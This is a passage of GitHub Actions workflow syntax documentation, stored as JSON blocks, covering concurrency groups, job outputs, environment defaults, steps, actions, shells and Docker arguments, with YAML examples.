          "The concurrency group name is case insensitive. For example,prodandProdwill be treated as the same concurrency group.",
          "Ordering is not guaranteed for jobs or workflow runs using concurrency groups. Jobs or workflow runs in the same concurrency group are handled in an arbitrary order."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using concurrency and the default behavior"
      },
      {
        "type": "paragraph",
        "text": "The default behavior of GitHub Actions is to allow multiple jobs or workflow runs to run concurrently. Theconcurrencykeyword allows you to control the concurrency of workflow runs."
      },
      {
        "type": "paragraph",
        "text": "For example, you can use theconcurrencykeyword immediately after where trigger conditions are defined to limit the concurrency of entire workflow runs for a specific branch:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true"
      },
      {
        "type": "paragraph",
        "text": "You can also limit the concurrency of jobs within a workflow by using theconcurrencykeyword at the job level:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n\njobs:\n  job-1:\n    runs-on: ubuntu-latest\n    concurrency:\n      group: example-group\n      cancel-in-progress: true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Concurrency groups"
      },
      {
        "type": "paragraph",
        "text": "Concurrency groups provide a way to manage and limit the execution of workflow runs or jobs that share the same concurrency key."
      },
      {
        "type": "paragraph",
        "text": "Theconcurrencykey is used to group workflows or jobs together into a concurrency group. When you define aconcurrencykey, GitHub Actions ensures that only one workflow or job with that key runs at any given time. If a new workflow run or job starts with the sameconcurrencykey, GitHub Actions will cancel any workflow or job already running with that key. Theconcurrencykey can be a hard-coded string, or it can be a dynamic expression that includes context variables."
      },
      {
        "type": "paragraph",
        "text": "It is possible to define concurrency conditions in your workflow so that the workflow or job is part of a concurrency group."
      },
      {
        "type": "paragraph",
        "text": "This means that when a workflow run or job starts, GitHub will cancel any workflow runs or jobs that are already in progress in the same concurrency group. This is useful in scenarios where you want to prevent parallel runs for a certain set of a workflows or jobs, such as the ones used for deployments to a staging environment, in order to prevent actions that could cause conflicts or consume more resources than necessary."
      },
      {
        "type": "paragraph",
        "text": "In this example,job-1is part of a concurrency group namedstaging_environment. This means that if a new run ofjob-1is triggered, any runs of the same job in thestaging_environmentconcurrency group that are already in progress will be cancelled."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job-1:\n    runs-on: ubuntu-latest\n    concurrency:\n      group: staging_environment\n      cancel-in-progress: true"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, using a dynamic expression such asconcurrency: ci-${{ github.ref }}in your workflow means that the workflow or job would be part of a concurrency group namedci-followed by the reference of the branch or tag that triggered the workflow. In this example, if a new commit is pushed to the main branch while a previous run is still in progress, the previous run will be cancelled and the new one will start:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n\nconcurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using concurrency to cancel any in-progress job or run"
      },
      {
        "type": "paragraph",
        "text": "To use concurrency to cancel any in-progress job or run in GitHub Actions, you can use theconcurrencykey with thecancel-in-progressoption set totrue:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "concurrency:\n  group: ${{ github.ref }}\n  cancel-in-progress: true"
      },
      {
        "type": "paragraph",
        "text": "Note that in this example, without defining a particular concurrency group, GitHub Actions will cancelanyin-progress run of the job or workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a fallback value"
      },
      {
        "type": "paragraph",
        "text": "If you build the group name with a property that is only defined for specific events, you can use a fallback value. For example,github.head_refis only defined onpull_requestevents. If your workflow responds to other events in addition topull_requestevents, you will need to provide a fallback to avoid a syntax error. The following concurrency group cancels in-progress jobs or runs onpull_requestevents only; ifgithub.head_refis undefined, the concurrency group will fallback to the run ID, which is guaranteed to be both unique and defined for the run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "concurrency:\n  group: ${{ github.head_ref || github.run_id }}\n  cancel-in-progress: true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Only cancel in-progress jobs or runs for the current workflow"
      },
      {
        "type": "paragraph",
        "text": "If you have multiple workflows in the same repository, concurrency group names must be unique across workflows to avoid canceling in-progress jobs or runs from other workflows. Otherwise, any previously in-progress or pending job will be canceled, regardless of the workflow."
      },
      {
        "type": "paragraph",
        "text": "To only cancel in-progress runs of the same workflow, you can use thegithub.workflowproperty to build the concurrency group:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "concurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Only cancel in-progress jobs on specific branches"
      },
      {
        "type": "paragraph",
        "text": "If you would like to cancel in-progress jobs on certain branches but not on others, you can use conditional expressions withcancel-in-progress. For example, you can do this if you would like to cancel in-progress jobs on development branches but not on release branches."
      },
      {
        "type": "paragraph",
        "text": "To only cancel in-progress runs of the same workflow when not running on a release branch, you can setcancel-in-progressto an expression similar to the following:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "concurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: ${{ !contains(github.ref, 'release/')}}"
      },
      {
        "type": "paragraph",
        "text": "In this example, multiple pushes to arelease/1.2.3branch would not cancel in-progress runs. Pushes to another branch, such asmain, would cancel in-progress runs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.outputs"
      },
      {
        "type": "paragraph",
        "text": "You can usejobs.<job_id>.outputsto create amapof outputs for a job. Job outputs are available to all downstream jobs that depend on this job. For more information on defining job dependencies, seejobs.<job_id>.needs."
      },
      {
        "type": "paragraph",
        "text": "Outputs can be a maximum of 1 MB per job. The total of all outputs in a workflow run can be a maximum of 50 MB. Size is approximated based on UTF-16 encoding."
      },
      {
        "type": "paragraph",
        "text": "Job outputs containing expressions are evaluated on the runner at the end of each job. Outputs containing secrets are redacted on the runner and not sent to GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "If an output is skipped because it may contain a secret, you will see the following warning message: \"Skip output{output.Key}since it may contain secret.\" For more information on how to handle secrets, please refer to theExample: Masking and passing a secret between jobs or workflows."
      },
      {
        "type": "paragraph",
        "text": "To use job outputs in a dependent job, you can use theneedscontext. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Defining outputs for a job"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n    runs-on: ubuntu-latest\n    # Map a step output to a job output\n    outputs:\n      output1: ${{ steps.step1.outputs.test }}\n      output2: ${{ steps.step2.outputs.test }}\n    steps:\n      - id: step1\n        run: echo \"test=hello\" >> \"$GITHUB_OUTPUT\"\n      - id: step2\n        run: echo \"test=world\" >> \"$GITHUB_OUTPUT\"\n  job2:\n    runs-on: ubuntu-latest\n    needs: job1\n    steps:\n      - env:\n          OUTPUT1: ${{needs.job1.outputs.output1}}\n          OUTPUT2: ${{needs.job1.outputs.output2}}\n        run: echo \"$OUTPUT1 $OUTPUT2\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using Job Outputs in a Matrix Job"
      },
      {
        "type": "paragraph",
        "text": "Matrices can be used to generate multiple outputs of different names. When using a matrix, job outputs will be combined from all jobs inside the matrix."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n    runs-on: ubuntu-latest\n    outputs:\n      output_1: ${{ steps.gen_output.outputs.output_1 }}\n      output_2: ${{ steps.gen_output.outputs.output_2 }}\n      output_3: ${{ steps.gen_output.outputs.output_3 }}\n    strategy:\n      matrix:\n        version: [1, 2, 3]\n    steps:\n      - name: Generate output\n        id: gen_output\n        run: |\n          version=\"${{ matrix.version }}\"\n          echo \"output_${version}=${version}\" >> \"$GITHUB_OUTPUT\"\n  job2:\n    runs-on: ubuntu-latest\n    needs: [job1]\n    steps:\n      # Will show\n      # {\n      #   \"output_1\": \"1\",\n      #   \"output_2\": \"2\",\n      #   \"output_3\": \"3\"\n      # }\n      - run: echo '${{ toJSON(needs.job1.outputs) }}'"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Actions does not guarantee the order that matrix jobs will run in. Ensure that the output name is unique, otherwise the last matrix job that runs will override the output value."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.env"
      },
      {
        "type": "paragraph",
        "text": "Amapof variables that are available to all steps in the job. You can set variables for the entire workflow or an individual step. For more information, seeenvandjobs.<job_id>.steps[*].env."
      },
      {
        "type": "paragraph",
        "text": "When more than one environment variable is defined with the same name, GitHub uses the most specific variable. For example, an environment variable defined in a step will override job and workflow environment variables with the same name, while the step executes. An environment variable defined for a job will override a workflow variable with the same name, while the job executes."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofjobs.<job_id>.env"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n    env:\n      FIRST_NAME: Mona"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.defaults"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.defaultsto create amapof default settings that will apply to all steps in the job. You can also set default settings for the entire workflow. For more information, seedefaults."
      },
      {
        "type": "paragraph",
        "text": "When more than one default setting is defined with the same name, GitHub uses the most specific default setting. For example, a default setting defined in a job will override a default setting that has the same name defined in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.defaults.run"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.defaults.runto provide defaultshellandworking-directoryto allrunsteps in the job."
      },
      {
        "type": "paragraph",
        "text": "You can provide defaultshellandworking-directoryoptions for allrunsteps in a job. You can also set default settings forrunfor the entire workflow. For more information, seedefaults.run."
      },
      {
        "type": "paragraph",
        "text": "These can be overridden at thejobs.<job_id>.defaults.runandjobs.<job_id>.steps[*].runlevels."
      },
      {
        "type": "paragraph",
        "text": "When more than one default setting is defined with the same name, GitHub uses the most specific default setting. For example, a default setting defined in a job will override a default setting that has the same name defined in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.defaults.run.shell"
      },
      {
        "type": "paragraph",
        "text": "Useshellto define theshellfor a step. This keyword can reference several contexts. For more information, seeContexts."
      },
      {
        "type": "paragraph",
        "text": "When more than one default setting is defined with the same name, GitHub uses the most specific default setting. For example, a default setting defined in a job will override a default setting that has the same name defined in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.defaults.run.working-directory"
      },
      {
        "type": "paragraph",
        "text": "Useworking-directoryto define the working directory for theshellfor a step. This keyword can reference several contexts. For more information, seeContexts."
      },
      {
        "type": "paragraph",
        "text": "Tip"
      },
      {
        "type": "paragraph",
        "text": "Ensure theworking-directoryyou assign exists on the runner before you run your shell in it.\nWhen more than one default setting is defined with the same name, GitHub uses the most specific default setting. For example, a default setting defined in a job will override a default setting that has the same name defined in a workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Setting defaultrunstep options for a job"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: bash\n        working-directory: ./scripts"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps"
      },
      {
        "type": "paragraph",
        "text": "A job contains a sequence of tasks calledsteps. Steps can run commands, run setup tasks, or run an action in your repository, a public repository, or an action published in a Docker registry. Not all steps run actions, but all actions run as a step. Each step runs in its own process in the runner environment and has access to the workspace and filesystem. Because steps run in their own process, changes to environment variables are not preserved between steps. GitHub provides built-in steps to set up and complete a job."
      },
      {
        "type": "paragraph",
        "text": "GitHub only displays the first 1,000 checks, however, you can run an unlimited number of steps as long as you are within the workflow usage limits. For more information, seeUsage limits, billing, and administrationfor GitHub-hosted runners andUsage limits for self-hosted runnersfor self-hosted runner usage limits."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofjobs.<job_id>.steps"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Greeting from Mona\n\non: push\n\njobs:\n  my-job:\n    name: My Job\n    runs-on: ubuntu-latest\n    steps:\n      - name: Print a greeting\n        env:\n          MY_VAR: Hi there! My name is\n          FIRST_NAME: Mona\n          MIDDLE_NAME: The\n          LAST_NAME: Octocat\n        run: |\n          echo $MY_VAR $FIRST_NAME $MIDDLE_NAME $LAST_NAME."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].id"
      },
      {
        "type": "paragraph",
        "text": "A unique identifier for the step. You can use theidto reference the step in contexts. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].if"
      },
      {
        "type": "paragraph",
        "text": "You can use theifconditional to prevent a step from running unless a condition is met. You can use any supported context and expression to create a conditional. For more information on which contexts are supported in this key, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "When you use expressions in anifconditional, you can, optionally, omit the${{ }}expression syntax because GitHub Actions automatically evaluates theifconditional as an expression. However, this exception does not apply everywhere."
      },
      {
        "type": "paragraph",
        "text": "You must always use the${{ }}expression syntax or escape with'',\"\", or()when the expression starts with!, since!is reserved notation in YAML format. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "if: ${{ ! startsWith(github.ref, 'refs/tags/') }}"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using contexts"
      },
      {
        "type": "paragraph",
        "text": "This step only runs when the event type is apull_requestand the event action isunassigned."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: My first step\n    if: ${{ github.event_name == 'pull_request' && github.event.action == 'unassigned' }}\n    run: echo This event is a pull request that had an assignee removed."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using status check functions"
      },
      {
        "type": "paragraph",
        "text": "Themy backup steponly runs when the previous step of a job fails. For more information, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: My first step\n    uses: octo-org/action-name@main\n  - name: My backup step\n    if: ${{ failure() }}\n    uses: actions/heroku@1.0.0"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using secrets"
      },
      {
        "type": "paragraph",
        "text": "Secrets cannot be directly referenced inif:conditionals. Instead, consider setting secrets as job-level environment variables, then referencing the environment variables to conditionally run steps in the job."
      },
      {
        "type": "paragraph",
        "text": "If a secret has not been set, the return value of an expression referencing the secret (such as${{ secrets.SuperSecret }}in the example) will be an empty string."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Run a step if a secret has been set\non: push\njobs:\n  my-jobname:\n    runs-on: ubuntu-latest\n    env:\n      super_secret: ${{ secrets.SuperSecret }}\n    steps:\n      - if: ${{ env.super_secret != '' }}\n        run: echo 'This step will only run if the secret has a value set.'\n      - if: ${{ env.super_secret == '' }}\n        run: echo 'This step will only run if the secret does not have a value set.'"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAccessing contextual information about workflow runsandUsing secrets in GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].name"
      },
      {
        "type": "paragraph",
        "text": "A name for your step to display on GitHub."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].uses"
      },
      {
        "type": "paragraph",
        "text": "Selects an action to run as part of a step in your job. An action is a reusable unit of code. You can use an action defined in the same repository as the workflow, a public repository, or in apublished Docker container image."
      },
      {
        "type": "paragraph",
        "text": "We strongly recommend that you include the version of the action you are using by specifying a Git ref, SHA, or Docker tag. If you don't specify a version, it could break your workflows or cause unexpected behavior when the action owner publishes an update."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using the commit SHA of a released action version is the safest for stability and security.",
          "If the action publishes major version tags, you should expect to receive critical fixes and security patches while still retaining compatibility. Note that this behavior is at the discretion of the action's author.",
          "Using the default branch of an action may be convenient, but if someone releases a new major version with a breaking change, your workflow could break."
        ]
      },
      {
        "type": "paragraph",
        "text": "Some actions require inputs that you must set using thewithkeyword. Review the action's README file to determine the inputs required."
      },
      {
        "type": "paragraph",
        "text": "Actions are either JavaScript files or Docker containers. If the action you're using is a Docker container you must run the job in a Linux environment. For more details, seeruns-on."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using versioned actions"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  # Reference a specific commit\n  - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3\n  # Reference the major version of a release\n  - uses: actions/checkout@v4\n  # Reference a specific version\n  - uses: actions/checkout@v4.2.0\n  # Reference a branch\n  - uses: actions/checkout@main"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a public action"
      },
      {
        "type": "paragraph",
        "text": "{owner}/{repo}@{ref}"
      },
      {
        "type": "paragraph",
        "text": "You can specify a branch, ref, or SHA in a public GitHub repository."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        # Uses the default branch of a public repository\n        uses: actions/heroku@main\n      - name: My second step\n        # Uses a specific version tag of a public repository\n        uses: actions/aws@v2.0.1"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a public action in a subdirectory"
      },
      {
        "type": "paragraph",
        "text": "{owner}/{repo}/{path}@{ref}"
      },
      {
        "type": "paragraph",
        "text": "A subdirectory in a public GitHub repository at a specific branch, ref, or SHA."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: actions/aws/ec2@main"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using an action in the same repository as the workflow"
      },
      {
        "type": "paragraph",
        "text": "./path/to/dir"
      },
      {
        "type": "paragraph",
        "text": "The path to the directory that contains the action in your workflow's repository. You must check out your repository before using the action."
      },
      {
        "type": "paragraph",
        "text": "Example repository file structure:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "|-- hello-world (repository)\n|   |__ .github\n|       └── workflows\n|           └── my-first-workflow.yml\n|       └── actions\n|           |__ hello-world-action\n|               └── action.yml"
      },
      {
        "type": "paragraph",
        "text": "The path is relative (./) to the default working directory (github.workspace,$GITHUB_WORKSPACE). If the action checks out the repository to a location different than the workflow, the relative path used for local actions must be updated."
      },
      {
        "type": "paragraph",
        "text": "Example workflow file:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    runs-on: ubuntu-latest\n    steps:\n      # This step checks out a copy of your repository.\n      - name: My first step - check out repository\n        uses: actions/checkout@v4\n      # This step references the directory that contains the action.\n      - name: Use local hello-world-action\n        uses: ./.github/actions/hello-world-action"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a Docker Hub action"
      },
      {
        "type": "paragraph",
        "text": "docker://{image}:{tag}"
      },
      {
        "type": "paragraph",
        "text": "A Docker image published onDocker Hub."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: docker://alpine:3.8"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using the GitHub Packages Container registry"
      },
      {
        "type": "paragraph",
        "text": "docker://{host}/{image}:{tag}"
      },
      {
        "type": "paragraph",
        "text": "A public Docker image in the GitHub Packages Container registry."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: docker://ghcr.io/OWNER/IMAGE_NAME"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a Docker public registry action"
      },
      {
        "type": "paragraph",
        "text": "docker://{host}/{image}:{tag}"
      },
      {
        "type": "paragraph",
        "text": "A Docker image in a public registry. This example uses the Google Container Registry atgcr.io."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: docker://gcr.io/cloud-builders/gradle"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using an action inside a different private repository than the workflow"
      },
      {
        "type": "paragraph",
        "text": "Your workflow must checkout the private repository and reference the action locally. Generate a personal access token and add the token as a secret. For more information, seeManaging your personal access tokensandUsing secrets in GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "ReplacePERSONAL_ACCESS_TOKENin the example with the name of your secret."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    steps:\n      - name: Check out repository\n        uses: actions/checkout@v4\n        with:\n          repository: octocat/my-private-repo\n          ref: v1.0\n          token: ${{ secrets.PERSONAL_ACCESS_TOKEN }}\n          path: ./.github/actions/my-private-repo\n      - name: Run my action\n        uses: ./.github/actions/my-private-repo/my-action"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, use a GitHub App instead of a personal access token in order to ensure your workflow continues to run even if the personal access token owner leaves. For more information, seeMaking authenticated API requests with a GitHub App in a GitHub Actions workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].run"
      },
      {
        "type": "paragraph",
        "text": "Runs command-line programs that do not exceed 21,000 characters using the operating system's shell. If you do not provide aname, the step name will default to the text specified in theruncommand."
      },
      {
        "type": "paragraph",
        "text": "Commands run using non-login shells by default. You can choose a different shell and customize the shell used to run commands. For more information, seejobs.<job_id>.steps[*].shell."
      },
      {
        "type": "paragraph",
        "text": "Eachrunkeyword represents a new process and shell in the runner environment. When you provide multi-line commands, each line runs in the same shell. For example:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A single-line command:-name:InstallDependenciesrun:npminstall",
          "A multi-line command:-name:Cleaninstalldependenciesandbuildrun:|\n    npm ci\n    npm run build"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].working-directory"
      },
      {
        "type": "paragraph",
        "text": "Using theworking-directorykeyword, you can specify the working directory of where to run the command."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Clean temp directory\n  run: rm -rf *\n  working-directory: ./temp"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can specify a default working directory for allrunsteps in a job, or for allrunsteps in the entire workflow. For more information, seedefaults.run.working-directoryandjobs.<job_id>.defaults.run.working-directory."
      },
      {
        "type": "paragraph",
        "text": "You can also use arunstep to run a script. For more information, seeAdding scripts to your workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].shell"
      },
      {
        "type": "paragraph",
        "text": "You can override the default shell settings in the runner's operating system and the job's default using theshellkeyword. You can use built-inshellkeywords, or you can define a custom set of shell options. The shell command that is run internally executes a temporary file that contains the commands specified in therunkeyword."
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can specify a default shell for allrunsteps in a job, or for allrunsteps in the entire workflow. For more information, seedefaults.run.shellandjobs.<job_id>.defaults.run.shell."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Running a command using Bash"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Display the path\n    shell: bash\n    run: echo $PATH"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Running a command using Windowscmd"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Display the path\n    shell: cmd\n    run: echo %PATH%"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Running a command using PowerShell Core"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Display the path\n    shell: pwsh\n    run: echo ${env:PATH}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using PowerShell Desktop to run a command"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Display the path\n    shell: powershell\n    run: echo ${env:PATH}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Running an inline Python script"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Display the path\n    shell: python\n    run: |\n      import os\n      print(os.environ['PATH'])"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Custom shell"
      },
      {
        "type": "paragraph",
        "text": "You can set theshellvalue to a template string usingcommand [options] {0} [more_options]. GitHub interprets the first whitespace-delimited word of the string as the command, and inserts the file name for the temporary script at{0}."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Display the environment variables and their values\n    shell: perl {0}\n    run: |\n      print %ENV"
      },
      {
        "type": "paragraph",
        "text": "The command used,perlin this example, must be installed on the runner."
      },
      {
        "type": "paragraph",
        "text": "For information about the software included on GitHub-hosted runners, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Exit codes and error action preference"
      },
      {
        "type": "paragraph",
        "text": "For built-in shell keywords, we provide the following defaults that are executed by GitHub-hosted runners. You should use these guidelines when running shell scripts."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "bash/sh:By default, fail-fast behavior is enforced usingset -efor bothshandbash. Whenshell: bashis specified,-o pipefailis also applied to enforce early exit from pipelines that generate a non-zero exit status.You can take full control over shell parameters by providing a template string to the shell options. For example,bash {0}.sh-like shells exit with the exit code of the last command executed in a script, which is also the default behavior for actions. The runner will report the status of the step as fail/succeed based on this exit code.",
          "By default, fail-fast behavior is enforced usingset -efor bothshandbash. Whenshell: bashis specified,-o pipefailis also applied to enforce early exit from pipelines that generate a non-zero exit status.",
          "You can take full control over shell parameters by providing a template string to the shell options. For example,bash {0}.",
          "sh-like shells exit with the exit code of the last command executed in a script, which is also the default behavior for actions. The runner will report the status of the step as fail/succeed based on this exit code.",
          "powershell/pwshFail-fast behavior when possible. Forpwshandpowershellbuilt-in shell, we will prepend$ErrorActionPreference = 'stop'to script contents.We appendif ((Test-Path -LiteralPath variable:\\LASTEXITCODE)) { exit $LASTEXITCODE }to powershell scripts so action statuses reflect the script's last exit code.Users can always opt out by not using the built-in shell, and providing a custom shell option like:pwsh -File {0}, orpowershell -Command \"& '{0}'\", depending on need.",
          "Fail-fast behavior when possible. Forpwshandpowershellbuilt-in shell, we will prepend$ErrorActionPreference = 'stop'to script contents.",
          "We appendif ((Test-Path -LiteralPath variable:\\LASTEXITCODE)) { exit $LASTEXITCODE }to powershell scripts so action statuses reflect the script's last exit code.",
          "Users can always opt out by not using the built-in shell, and providing a custom shell option like:pwsh -File {0}, orpowershell -Command \"& '{0}'\", depending on need.",
          "cmdThere doesn't seem to be a way to fully opt into fail-fast behavior other than writing your script to check each error code and respond accordingly. Because we can't actually provide that behavior by default, you need to write this behavior into your script.cmd.exewill exit with the error level of the last program it executed, and it will return the error code to the runner. This behavior is internally consistent with the previousshandpwshdefault behavior and is thecmd.exedefault, so this behavior remains intact.",
          "There doesn't seem to be a way to fully opt into fail-fast behavior other than writing your script to check each error code and respond accordingly. Because we can't actually provide that behavior by default, you need to write this behavior into your script.",
          "cmd.exewill exit with the error level of the last program it executed, and it will return the error code to the runner. This behavior is internally consistent with the previousshandpwshdefault behavior and is thecmd.exedefault, so this behavior remains intact."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].with"
      },
      {
        "type": "paragraph",
        "text": "Amapof the input parameters defined by the action. Each input parameter is a key/value pair. Input parameters are set as environment variables. The variable is prefixed withINPUT_and converted to upper case."
      },
      {
        "type": "paragraph",
        "text": "Input parameters defined for a Docker container must useargs. For more information, seejobs.<job_id>.steps[*].with.args."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofjobs.<job_id>.steps[*].with"
      },
      {
        "type": "paragraph",
        "text": "Defines the three input parameters (first_name,middle_name, andlast_name) defined by thehello_worldaction. These input variables will be accessible to thehello-worldaction asINPUT_FIRST_NAME,INPUT_MIDDLE_NAME, andINPUT_LAST_NAMEenvironment variables."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: actions/hello_world@main\n        with:\n          first_name: Mona\n          middle_name: The\n          last_name: Octocat"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].with.args"
      },
      {
        "type": "paragraph",
        "text": "Astringthat defines the inputs for a Docker container. GitHub passes theargsto the container'sENTRYPOINTwhen the container starts up. Anarray of stringsis not supported by this parameter. A single argument that includes spaces should be surrounded by double quotes\"\"."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofjobs.<job_id>.steps[*].with.args"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Explain why this job ran\n    uses: octo-org/action-name@main\n    with:\n      entrypoint: /bin/echo\n      args: The ${{ github.event_name }} event triggered this step."
      },
      {
        "type": "paragraph",
        "text": "Theargsare used in place of theCMDinstruction in aDockerfile. If you useCMDin yourDockerfile, use the guidelines ordered by preference:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Document required arguments in the action's README and omit them from theCMDinstruction.",
          "Use defaults that allow using the action without specifying anyargs.",
          "If the action exposes a--helpflag, or something similar, use that as the default to make your action self-documenting."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].with.entrypoint"
      },
      {
        "type": "paragraph",
        "text": "Overrides the DockerENTRYPOINTin theDockerfile, or sets it if one wasn't already specified. Unlike the DockerENTRYPOINTinstruction which has a shell and exec form,entrypointkeyword accepts only a single string defining the executable to be run."
      },
      {
        "type": "heading",
        "level": 3,
